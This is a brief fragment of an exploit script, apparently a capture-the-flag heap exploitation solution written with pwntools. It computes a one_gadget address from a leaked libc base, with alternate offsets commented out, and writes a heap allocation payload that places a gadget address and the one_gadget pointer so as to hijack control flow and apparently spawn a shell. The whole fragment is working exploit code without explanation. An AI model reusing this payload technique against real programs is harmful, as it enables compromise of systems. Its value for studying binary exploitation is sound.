...
one_gagu = libc.address + 0xda811
# one_gagu = libc.address + 0xda814
# one_gagu = libc.address + 0xda817


new(68, 0x48, "bubu")
new(69, 0x48, b"a"*8 + p64(libc.address + 0x000000000002eec7) + p64(0) + p64(0) + p64(one_gagu))
